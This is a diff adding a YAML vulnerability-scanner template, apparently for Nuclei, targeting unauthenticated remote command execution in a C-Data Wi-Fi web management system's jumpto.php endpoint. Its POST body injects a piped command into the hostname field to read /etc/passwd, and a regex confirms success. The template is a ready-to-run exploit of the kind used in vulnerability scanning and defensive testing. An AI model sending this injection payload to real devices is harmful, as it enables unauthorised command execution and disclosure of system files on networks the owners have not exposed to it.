@@ -1,0 +1,23 @@
+id: poc-yaml-cdatatec-jumpto-rce
+info:
+  name: 西迪特 Wi-Fi Web管理系统 jumpto.php未授权RCE漏洞
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: command-injection
+
+http:
+  - method: POST
+    path:
+      - "/cgi-bin/jumpto.php?class=diagnosis&page=config_save&isphp=1"
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+    body: |-
+      call_function=ping&iface=eth0&hostname=127.0.0.1|cat%20/etc/passwd
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: regex
+        regex:
+          - "root:.*:0:0:"
